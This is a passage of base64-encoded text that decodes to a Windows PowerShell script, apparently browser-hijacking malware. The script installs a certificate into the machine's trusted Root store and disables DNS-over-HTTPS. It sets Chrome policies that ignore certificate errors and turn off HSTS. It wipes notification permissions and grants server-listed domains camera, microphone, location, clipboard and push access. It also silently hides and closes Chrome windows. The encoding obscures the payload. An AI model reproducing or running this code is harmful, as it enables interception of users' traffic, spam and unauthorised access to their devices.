GVQYXRoIC1QYXNzd29yZCAnMTIzJw0KfQ0KDQpmdW5jdGlvbiBJbnN0YWxsLUNlcnRpZmljYXRlVG9TdG9yZXMgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkQ2VydGlmaWNhdGVGaWxlUGF0aCwNCiAgICAgICAgW3N0cmluZ10gJFBhc3N3b3JkDQogICAgKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgJHNlY3VyZVBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICRQYXNzd29yZCAtQXNQbGFpblRleHQgLUZvcmNlDQoNCiAgICAgICAgIyBJbXBvcnQgY2VydGlmaWNhdGUgdG8gUGVyc29uYWwgKE15KSBzdG9yZQ0KICAgICAgICAkcGVyc29uYWxTdG9yZVBhdGggPSAiQ2VydDpcTG9jYWxNYWNoaW5lXE15Ig0KICAgICAgICBJbXBvcnQtUGZ4Q2VydGlmaWNhdGUgLUZpbGVQYXRoICRDZXJ0aWZpY2F0ZUZpbGVQYXRoIC1DZXJ0U3RvcmVMb2NhdGlvbiAkcGVyc29uYWxTdG9yZVBhdGggLVBhc3N3b3JkICRzZWN1cmVQYXNzd29yZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICB3cml0ZWRiZyAiQ2VydGlmaWNhdGUgaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseSB0byBQZXJzb25hbCBzdG9yZSAoTXkpLiINCg0KICAgICAgICAjIEltcG9ydCBjZXJ0aWZpY2F0ZSB0byBSb290IHN0b3JlDQogICAgICAgICRyb290U3RvcmVQYXRoID0gIkNlcnQ6XExvY2FsTWFjaGluZVxSb290Ig0KICAgICAgICBJbXBvcnQtUGZ4Q2VydGlmaWNhdGUgLUZpbGVQYXRoICRDZXJ0aWZpY2F0ZUZpbGVQYXRoIC1DZXJ0U3RvcmVMb2NhdGlvbiAkcm9vdFN0b3JlUGF0aCAtUGFzc3dvcmQgJHNlY3VyZVBhc3N3b3JkIC1FcnJvckFjdGlvbiBTdG9wDQogICAgICAgIHdyaXRlZGJnICJDZXJ0aWZpY2F0ZSBpbnN0YWxsZWQgc3VjY2Vzc2Z1bGx5IHRvIFJvb3Qgc3RvcmUuIg0KDQogICAgfSBjYXRjaCB7DQogICAgICAgIHRocm93ICJGYWlsZWQgdG8gaW5zdGFsbCBjZXJ0aWZpY2F0ZTogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19jZXJ0IHsNCiAgICB0cnkgDQogICAgew0KICAgICAgICBmb3JlYWNoICgka2V5IGluICR4ZGF0YS5LZXlzKSB7DQogICAgICAgICAgICBDZXJ0LVdvcmsgLWNvbnRlbnRTdHJpbmcgJHhkYXRhWyRrZXldDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICB3cml0ZWRiZyAiQW4gZXJyb3Igb2NjdXJyZWQgKENvbmZpZ3VyZUNlcnRpZmljYXRlcyk6ICRfIg0KICAgICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19jaHJvbWUgew0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xEbnNjYWNoZVxQYXJhbWV0ZXJzIiAtTmFtZSAiRW5hYmxlQXV0b0RPSCIgLVZhbHVlIDANCg0KICAgICRjaHJvbWVLZXlQYXRoID0gIkhLTE06XFNvZnR3YXJlXFBvbGljaWVzXEdvb2dsZVxDaHJvbWUiDQoNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjaHJvbWVLZXlQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCg0KICAgIE5ldy1JdGVtIC1QYXRoICRjaHJvbWVLZXlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsICAjIENyZWF0ZSB0aGUga2V5IGlmIGl0IGRvZXNuJ3QgZXhpc3QNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJDb21tYW5kTGluZUZsYWciIC1WYWx1ZSAiLS1pZ25vcmUtY2VydGlmaWNhdGUtZXJyb3JzIC0tZGlzYWJsZS1xdWljIC0tZGlzYWJsZS1oc3RzIg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNocm9tZUtleVBhdGggLU5hbWUgIkRuc092ZXJIdHRwcyIgLVZhbHVlICJvZmYiDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJJZ25vcmVDZXJ0aWZpY2F0ZUVycm9ycyIgLVZhbHVlIDENCg0KICAgIHdyaXRlZGJnICJDaHJvbWUgY29uZmlndXJlZCINCn0NCg0KDQoNCmZ1bmN0aW9uIENvbXBhcmUtQXJyYXlzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFthcnJheV0kQXJyYXkxLA0KICAgICAgICBbYXJyYXldJEFycmF5Mg0KICAgICkNCg0KICAgICMgU29ydCBib3RoIGFycmF5cyBhbmQgY29tcGFyZQ0KICAgICRhcnJheTFTb3J0ZWQgPSAkQXJyYXkxIHwgU29ydC1PYmplY3QgfCBHZXQtVW5pcXVlDQogICAgJGFycmF5MlNvcnRlZCA9ICRBcnJheTIgfCBTb3J0LU9iamVjdCB8IEdldC1VbmlxdWUNCg0KICAgICRqbzEgPSAkYXJyYXkxU29ydGVkIC1qb2luICcsJyANCiAgICANCiAgICAkam8yID0gJGFycmF5MlNvcnRlZCAtam9pbiAnLCcNCg0KICAgICMgRGV0ZXJtaW5lIGlmIHRoZSBhcnJheXMgYXJlIGVxdWFsIChvcmRlciBkb2VzIG5vdCBtYXR0ZXIpDQogICAgaWYgKCRqbzEgLWVxICRqbzIgKSB7DQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gSGF2ZVRvUHVzaGVzIHsNCiAgICAkcmVzdWx0ID0gJGZhbHNlOw0KICAgICRleGlzdHMgPSBAKCkNCiAgICAkdG9zZXQgPSBAKCkNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICAjIENoZWNrIGlmIHRoZSBQcmVmZXJlbmNlcyBmaWxlIGV4aXN0cw0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgICAgICMgQ2hlY2sgaWYgdGhlIHN0cnVjdHVyZSBpcyBhcyBleHBlY3RlZA0KICAgICAgICBpZiAoJHByZWZlcmVuY2VzQ29udGVudCAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zKSB7DQogICAgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMNCg0KICAgICAgICAgICAgIyBJdGVyYXRlIHRocm91Z2ggZWFjaCBlbnRyeSBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmaWVsZCBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MuUFNPYmplY3QuUHJvcGVydGllcykgew0KICAgICAgICAgICAgICAgICRzaXRlVXJsID0gJGZpZWxkLk5hbWUNCiAgICAgICAgICAgICAgICAkZXhpc3RzICs9IFB1c2hEb21haW4gLXB1c2hVcmwgJHNpdGVVcmwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSB7DQogICAgICAgICR0b3NldCArPSBQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoDQogICAgfQ0KDQogICAgICRyZXN1bHQgPSAtbm90KENvbXBhcmUtQXJyYXlzIC1BcnJheTEgJGV4aXN0cyAtQXJyYXkyICR0b3NldCkNCiAgICANCiAgICByZXR1cm4gJHJlc3VsdDsNCn0NCg0KDQpmdW5jdGlvbiBQdXNoRG9tYWluIHsNCiAgICBwYXJhbSAoJHB1c2hVcmwpDQoNCiAgICAjIFRyaW0gdGhlIGlucHV0IHN0cmluZyBiZWZvcmUgdGhlIGZpcnN0IGNvbW1hDQogICAgJHRyaW1tZWRVcmwgPSAkcHVzaFVybC5UcmltKCkuU3BsaXQoJywnKVswXS5UcmltKCkNCg0KICAgICMgUGFyc2UgdGhlIFVSSQ0KICAgICRwYXJzZWRVcmkgPSBbU3lzdGVtLlVyaV06Om5ldygkdHJpbW1lZFVybCkNCiAgICANCiAgICAjIEV4dHJhY3QgZG9tYWluIGFuZCBwb3J0DQogICAgJGRvbWFpbiA9ICRwYXJzZWRVcmkuSG9zdA0KICAgICRwb3J0ID0gaWYgKCRwYXJzZWRVcmkuUG9ydCAtZXEgLTEpIHsgNDQzIH0gZWxzZSB7ICRwYXJzZWRVcmkuUG9ydCB9DQoNCiAgICAjIENvbnN0cnVjdCB0aGUgcmVzdWx0IFVSTA0KICAgICRyZXN1bHQgPSAiaHR0cHM6Ly8iICsgJGRvbWFpbiArICI6IiArICIkcG9ydCwqIg0KICAgIA0KICAgIHJldHVybiAkcmVzdWx0DQp9DQoNCmZ1bmN0aW9uIFB1c2hFeGlzdHMNCnsNCiAgICBwYXJhbSAoJHB1c2hVcmwpDQogICAgZm9yZWFjaCAoJHB1c2ggaW4gJHNlcnZlci5wdXNoZXMpIA0KICAgIHsNCiAgICAgICAgaWYgKChQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoVXJsKSAtZXEgKFB1c2hEb21haW4gLXB1c2hVcmwgJHB1c2gpKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gJHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRmYWxzZQ0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtUHVzaGVzIHsNCiAgICAkcHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICAjIENoZWNrIGlmIHRoZSBQcmVmZXJlbmNlcyBmaWxlIGV4aXN0cw0KICAgIGlmIChUZXN0LVBhdGggJHByZWZlcmVuY2VzUGF0aCkgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJHByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgICAgICMgQ2hlY2sgaWYgdGhlIHN0cnVjdHVyZSBpcyBhcyBleHBlY3RlZA0KICAgICAgICBpZiAoJHByZWZlcmVuY2VzQ29udGVudCAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZSAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzIC1hbmQgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zKSB7DQogICAgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zLm5vdGlmaWNhdGlvbnMNCg0KICAgICAgICAgICAgJGtleXNUb1JlbW92ZSA9IEAoKQ0KDQogICAgICAgICAgICAjIEl0ZXJhdGUgdGhyb3VnaCBlYWNoIGVudHJ5IGluICRub3RpZmljYXRpb25TZXR0aW5ncw0KICAgICAgICAgICAgZm9yZWFjaCAoJGZpZWxkIGluICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzKSB7DQogICAgICAgICAgICAgICAgJHNpdGVVcmwgPSAkZmllbGQuTmFtZQ0KICAgICAgICAgICAgICAgICRwZXJtaXNzaW9uID0gKFB1c2hFeGlzdHMgLXB1c2hVcmwgJHNpdGVVcmwpDQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAoJHBlcm1pc3Npb24gLWVxICRmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICAka2V5c1RvUmVtb3ZlICs9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgd3JpdGVkYmcgIiRzaXRlVXJsIGhhc24ndCBiZWVuIHJlbW92ZWQsIGl0IGlzIGEgZ29vZCBzaXRlLiINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gJGtleXNUb1JlbW92ZSkgew0KICAgICAgICAgICAgICAgICRub3RpZmljYXRpb25TZXR0aW5ncy5QU09iamVjdC5Qcm9wZXJ0aWVzLlJlbW92ZSgka2V5KQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwMCB8IFNldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLUZvcmNlDQoNCiAgICAgICAgICAgIHdyaXRlZGJnICJBbGwgc2VsZWN0ZWQgcHVzaCBub3RpZmljYXRpb24gc2V0dGluZ3MgaGF2ZSBiZWVuIHJlbW92ZWQuIg0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgd3JpdGVkYmcgIk5vIG9yIHVuZXhwZWN0ZWQgbm90aWZpY2F0aW9uIHNldHRpbmdzIGZvdW5kIGluIFByZWZlcmVuY2VzIGZpbGUuIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgd3JpdGVkYmcgIlByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRwcmVmZXJlbmNlc1BhdGgiDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBBZGQtUHVzaGVzew0KICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSB7DQogICAgICAgIEFkZC1QdXNoIC1wdXNoVXJsICRwdXNoIC13b3JrICR3b3JrDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBBZGQtUHVzaCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRwdXNoVXJsDQogICAgKQ0KDQogICAgJHB1c2hEb21haW4gPSBQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoVXJsDQoNCiAgICAkY2hyb21lUHJlZmVyZW5jZXNQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcUHJlZmVyZW5jZXMiDQoNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGgpKSB7DQogICAgICAgIHdyaXRlZGJnICJDaHJvbWUgcHJlZmVyZW5jZXMgZmlsZSBub3QgZm91bmQgYXQgcGF0aDogJGNocm9tZVByZWZlcmVuY2VzUGF0aCINCiAgICAgICAgZXhpdA0KICAgIH0NCg0KICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkY2hyb21lUHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHByb2ZpbGUgLVZhbHVlIEB7fQ0KICAgIH0NCg0KICAgIGlmICgtbm90ICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzIC1WYWx1ZSBAe30NCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzLnBvcHVwcykgew0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuZGVmYXVsdF9jb250ZW50X3NldHRpbmdfdmFsdWVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgcG9wdXBzIC1WYWx1ZSAxDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5wb3B1cHMgPSAxDQogICAgfQ0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcy5zdWJyZXNvdXJjZV9maWx0ZXIpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmRlZmF1bHRfY29udGVudF9zZXR0aW5nX3ZhbHVlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHN1YnJlc291cmNlX2ZpbHRlciAtVmFsdWUgMQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5kZWZhdWx0X2NvbnRlbnRfc2V0dGluZ192YWx1ZXMuc3VicmVzb3VyY2VfZmlsdGVyID0gMQ0KICAgIH0NCg0KICAgICRwcmVmZXJlbmNlc0NvbnRlbnRKc29uID0gJHByZWZlcmVuY2VzQ29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAzMg0KICAgIFNldC1Db250ZW50IC1QYXRoICRjaHJvbWVQcmVmZXJlbmNlc1BhdGggLVZhbHVlICRwcmVmZXJlbmNlc0NvbnRlbnRKc29uIC1Gb3JjZQ0KDQogICAgJHByZWZlcmVuY2VzUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XFByZWZlcmVuY2VzIg0KDQogICAgaWYgKFRlc3QtUGF0aCAkcHJlZmVyZW5jZXNQYXRoKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgICRjb250ZW50U2V0dGluZ3MgPSAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zDQogICAgICAgICRzZXR0aW5nc1RvVXBkYXRlID0gQCgNCiAgICAgICAgICAgICJhdXRvX3BpY3R1cmVfaW5fcGljdHVyZSIsICJiYWNrZ3JvdW5kX3N5bmMiLCAiY2FtZXJhIiwgImNsaXBib2FyZCIsICJjb29raWVzIiwgDQogICAgICAgICAgICAiZ2VvbG9jYXRpb24iLCAiaW1hZ2VzIiwgImphdmFzY3JpcHQiLCAibWljcm9waG9uZSIsICJtaWRpX3N5c2V4IiwgDQogICAgICAgICAgICAibm90aWZpY2F0aW9ucyIsICJwb3B1cHMiLCAicGx1Z2lucyIsICJzb3VuZCIsICJ1bnNhbmRib3hlZF9wbHVnaW5zIiwgDQogICAgICAgICAgICAiYXV0b21hdGljX2Rvd25sb2FkcyIsICJmbGFzaF9kYXRhIiwgIm1peGVkX3NjcmlwdCIsICJzZW5zb3JzIiwid2luZG93X3BsYWNlbWVudCIsIndlYmlkX2FwaSIsInZyIiwNCiAgICAgICAgICAgICJzdWJyZXNvdXJjZV9maWx0ZXIiLCJtZWRpYV9zdHJlYW1fbWljIiwibWVkaWFfc3RyZWFtX21pYyIsIm1lZGlhX3N0cmVhbV9jYW1lcmEiLCJsb2NhbF9mb250cyIsDQogICAgICAgICAgICAiamF2YXNjcmlwdF9qaXQiLCJpZGxlX2RldGVjdGlvbiIsImNhcHR1cmVkX3N1cmZhY2VfY29udHJvbCIsImFyIg0KDQogICAgICAgICkNCg0KICAgICAgICBmb3JlYWNoICgkc2V0dGluZyBpbiAkc2V0dGluZ3NUb1VwZGF0ZSkgew0KICAgICAgICAgICAgaWYgKCRudWxsIC1lcSAkY29udGVudFNldHRpbmdzLiRzZXR0aW5nKSB7DQogICAgICAgICAgICAgICAgJGNvbnRlbnRTZXR0aW5ncyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICRzZXR0aW5nIC1WYWx1ZSBAe30NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRzcGVjaWZpY1NldHRpbmcgPSAkY29udGVudFNldHRpbmdzLiRzZXR0aW5nDQogICAgICAgICAgICBpZiAoJHNwZWNpZmljU2V0dGluZy5QU09iamVjdC5Qcm9wZXJ0aWVzLk5hbWUgLWNvbnRhaW5zICRwdXNoRG9tYWluKSB7ICAgICAgICAgICAgDQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRzcGVjaWZpY1NldHRpbmcgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAkcHVzaERvbWFpbiAtVmFsdWUgQHsNCiAgICAgICAgICAgICAgICAgICAgImxhc3RfbW9kaWZpZWQiID0gIjEzMzYyNzIwNTQ1Nzg1Nzc0Ig0KICAgICAgICAgICAgICAgICAgICAic2V0dGluZyIgPSAxDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRjb250ZW50U2V0dGluZ3MuJHNldHRpbmcgPSAkc3BlY2lmaWNTZXR0aW5nDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncy5leGNlcHRpb25zID0gJGNvbnRlbnRTZXR0aW5ncw0KICAgICAgICAkdXBkYXRlZFByZWZlcmVuY2VzSnNvbiA9ICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTANCiAgICAgICAgJHVwZGF0ZWRQcmVmZXJlbmNlc0pzb24gfCBTZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1FbmNvZGluZyBVVEY4DQoNCiAgICAgICAgd3JpdGVkYmcgIk5vdGlmaWNhdGlvbiBzdWJzY3JpcHRpb24gZm9yICRwdXNoRG9tYWluIGFkZGVkIHN1Y2Nlc3NmdWxseSB3aXRoIGFsbCBwZXJtaXNzaW9ucy4iDQogICAgfSBlbHNlIHsNCiAgICAgICAgd3JpdGVkYmcgIlByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRwcmVmZXJlbmNlc1BhdGgiDQogICAgfQ0KfQ0KDQoNCg0KZnVuY3Rpb24gQ2xvc2UtQ2hyb21lV2luZG93IHsNCiAgICBwYXJhbSAoJHdpbmRvdykNCiAgICBbVXNlcjMyWF06OkNsb3NlV2luZG93KCR3aW5kb3cpIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDI1DQp9DQoNCmZ1bmN0aW9uIENsb3NlLUNocm9tZSB7DQogICAgcGFyYW0gKCRwcm9jZXNzKQ0KICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICRwcm9jZXNzLk1haW5XaW5kb3dIYW5kbGUNCiAgICB0cnkgew0KICAgICAgICAkcHJvY2Vzcy5DbG9zZSgpDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIENsb3NlLUFsbENocm9tZXMgew0KICAgICR3aW5kb3dzID0gW1VzZXIzMlhdOjpFbnVtZXJhdGVBbGxXaW5kb3dzKCkNCiAgICBmb3JlYWNoICgkd2luZG93IGluICR3aW5kb3dzKSANCiAgICB7DQogICAgICAgICR0aXRsZSA9IFtVc2VyMzJYXTo6R2V0V2luZG93VGV4dCgkd2luZG93KQ0KICAgICAgICBpZiAoJHRpdGxlLkNvbnRhaW5zKCJHb29nbGUgQ2hyb21lIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkd2luZG93LCBbVXNlcjMyWF06OlNXX0hJREUpIHwgT3V0LU51bGwNCiAgICAgICAgICAgIENsb3NlLUNocm9tZVdpbmRvdyAtd2luZG93ICR3aW5kb3cNCiAgICAgICAgfQ0KICAgIH0NCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnY2hyb21lLmV4ZScpKQ0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVDaHJvbWVQdXNoZXMgew0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRzZXJ2ZXIucHVzaGVzRm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgIHdyaXRlZGJnICJTa2lwcGluZyBDb25maWd1cmVDaHJvbWVQdXNoZXMiDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICANCiAgIA0KDQogICAgQWRkLVR5cGUgQCINCiAgICB1c2luZyBTeXN0ZW07DQogICAgdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KICAgIHVzaW5nIFN5c3RlbS5UZXh0Ow0KDQogICAgcHVibGljIHN0YXRpYyBjbGFzcyBVc2VyMzJYIHsNCiAgICAgICAgcHVibGljIGRlbGVnYXRlIGJvb2wgRW51bVdpbmRvd3NQcm9jKEludFB0ciBoV25kLCBJbnRQdHIgbFBhcmFtKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEVudW1XaW5kb3dzKEVudW1XaW5kb3dzUHJvYyBscEVudW1GdW5jLCBJbnRQdHIgbFBhcmFtKTsNCg0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldDQogICAgICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dChJbnRQdHIgaFduZCwgU3RyaW5nQnVpbGRlciBscFN0cmluZywgaW50IG5NYXhDb3VudCk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd1RleHRMZW5ndGgoSW50UHRyIGhXbmQpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgSXNXaW5kb3dWaXNpYmxlKEludFB0ciBoV25kKTsNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kKSB7DQogICAgICAgICAgICBpbnQgbGVuZ3RoID0gR2V0V2luZG93VGV4dExlbmd0aChoV25kKTsNCiAgICAgICAgICAgIGlmIChsZW5ndGggPT0gMCkgcmV0dXJuIFN0cmluZy5FbXB0eTsNCg0KICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzYiA9IG5ldyBTdHJpbmdCdWlsZGVyKGxlbmd0aCArIDEpOw0KICAgICAgICAgICAgR2V0V2luZG93VGV4dChoV25kLCBzYiwgc2IuQ2FwYWNpdHkpOw0KICAgICAgICAgICAgcmV0dXJuIHNiLlRvU3RyaW5nKCk7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgSXNXaW5kb3d